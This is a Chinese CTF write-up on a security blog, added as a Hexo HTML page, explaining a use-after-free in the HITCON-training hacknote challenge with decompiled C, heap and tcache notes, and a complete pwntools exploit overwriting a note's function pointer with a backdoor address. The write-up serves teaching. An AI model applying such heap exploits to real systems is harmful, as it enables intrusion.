@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Using-After-Free总之就是free后没有将指针置为null造成的，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Using-After-Free">
+<meta property="og:url" content="http://example.com/2023/03/04/Using-After-Free/index.html">
+<meta property="og:site_name" content="Computer Security">
+<meta property="og:description" content="Using-After-Free总之就是free后没有将指针置为null造成的，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/03/04/Using-After-Free/image-20230304180356251.png">
+<meta property="og:image" content="http://example.com/2023/03/04/Using-After-Free/image-20230304184036356.png">
+<meta property="og:image" content="http://example.com/2023/03/04/Using-After-Free/image-20230304184226530.png">
+<meta property="og:image" content="http://example.com/2023/03/04/Using-After-Free/image-20230304185117164.png">
+<meta property="og:image" content="http://example.com/2023/03/04/Using-After-Free/image-20230304185427692.png">
+<meta property="og:image" content="http://example.com/2023/03/04/Using-After-Free/image-20230304190759691.png">
+<meta property="og:image" content="http://example.com/2023/03/04/Using-After-Free/image-20230304192052112.png">
+<meta property="article:published_time" content="2023-03-04T09:53:14.000Z">
+<meta property="article:modified_time" content="2023-03-05T03:41:10.775Z">
+<meta property="article:author" content="Grxer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/03/04/Using-After-Free/image-20230304180356251.png">
+
+<link rel="canonical" href="http://example.com/2023/03/04/Using-After-Free/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Using-After-Free | Computer Security</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Computer Security</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Grxer</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/04/Using-After-Free/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Grxer">
+      <meta itemprop="description" content="major in security">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Computer Security">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Using-After-Free
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-04 17:53:14" itemprop="dateCreated datePublished" datetime="2023-03-04T17:53:14+08:00">2023-03-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-05 11:41:10" itemprop="dateModified" datetime="2023-03-05T11:41:10+08:00">2023-03-05</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Using-After-Free"><a href="#Using-After-Free" class="headerlink" title="Using-After-Free"></a>Using-After-Free</h1><p>总之就是free后没有将指针置为null造成的，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</p>
+<span id="more"></span>
+
+<h2 id="HITCON-training-lib10"><a href="#HITCON-training-lib10" class="headerlink" title="HITCON-training lib10"></a>HITCON-training lib10</h2><p>题目链接：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230304180356251.png" alt="image-20230304180356251"></p>
+<p>题目可以最多创建5个note,会放在全局变量notelist里(00x804A070)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> (*put)(<span class="type">void</span>*);</span><br><span class="line">    <span class="type">char</span> *content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>后没有将指针置为<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>print_note里有</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  notelist[v1]-&gt;put(notelist[v1]);</span><br></pre></td></tr></table></figure>
+
+<p>有后门函数magic</p>
+<p>如果我们可以控制notelist[v1]-&gt;put为magic就可以拿到flag</p>
+<p>在 add_note里我们会先malloc note结构体，后面会再申请context的内存，del时会先</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line"><span class="built_in">free</span>(notelist[v1]);</span><br></pre></td></tr></table></figure>
+
+<p>我们先</p>
+<p>addnote(16, b”aaaa”) # add note 0<br>addnote(16, b”ddaa”) # add note 1</p>
+<p>第一次malloc</p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230304184036356.png" alt="image-20230304184036356"></p>
+<p>第二次</p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230304184226530.png" alt="image-20230304184226530"></p>
+<p>依次malloc，堆的是这样的</p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230304185117164.png" alt="image-20230304185117164"></p>
+<p>我们去free</p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230304185427692.png" alt="image-20230304185427692"></p>
+<h3 id="tchche-bin"><a href="#tchche-bin" class="headerlink" title="tchche bin"></a>tchche bin</h3><p><strong>Tcache</strong>机制是在<strong>libc-2.26</strong>中引入，小于0x400的堆，<strong>FILO</strong>(先进后出)的单循环链表、精确分配(不切割)、<strong>free</strong>后为防止合并后一个堆块的<strong>inuse</strong>位不置<strong>0</strong>，大小低于<strong>0x400</strong>字节的堆块时会首先放入<strong>Tcachebin</strong>，每个bins最多存放7个chunk，malloc在申请大小低于<strong>0x400</strong>的堆块时</p>
+<p>再次申请</p>
+<p>addnote(8, p32(magic))</p>
+<p>这里都需要0x10大小的chunk，刚好有两个</p>
+<p>这样我们修改note3的context内容也就修改了note1的put指针</p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230304190759691.png" alt="image-20230304190759691"></p>
+<p><img src="/2023/03/04/Using-After-Free/image-20230304192052112.png" alt="image-20230304192052112"></p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">16</span>, <span class="string">b&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">16</span>, <span class="string">b&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="2016-HCTF-fheap-DOUBLE-FREE"><a href="#2016-HCTF-fheap-DOUBLE-FREE" class="headerlink" title="2016 HCTF fheap DOUBLE FREE"></a>2016 HCTF fheap DOUBLE FREE</h2>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/02/AsisCTF2016b00ks-OBO/" rel="prev" title="OFF-BY-ONE AsisCTF2016b00ks">
+      <i class="fa fa-chevron-left"></i> OFF-BY-ONE AsisCTF2016b00ks
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/03/05/sd-police2023-pwn/" rel="next" title="2023黄河流域公安院校网络空间安全技能挑战赛 SandBox">
+      2023黄河流域公安院校网络空间安全技能挑战赛 SandBox <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Using-After-Free"><span class="nav-number">1.</span> <span class="nav-text">Using-After-Free</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HITCON-training-lib10"><span class="nav-number">1.1.</span> <span class="nav-text">HITCON-training lib10</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#tchche-bin"><span class="nav-number">1.1.1.</span> <span class="nav-text">tchche bin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-number">1.1.2.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2016-HCTF-fheap-DOUBLE-FREE"><span class="nav-number">1.2.</span> <span class="nav-text">2016 HCTF fheap DOUBLE FREE</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Grxer</p>
+  <div class="site-description" itemprop="description">major in security</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Grxer</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
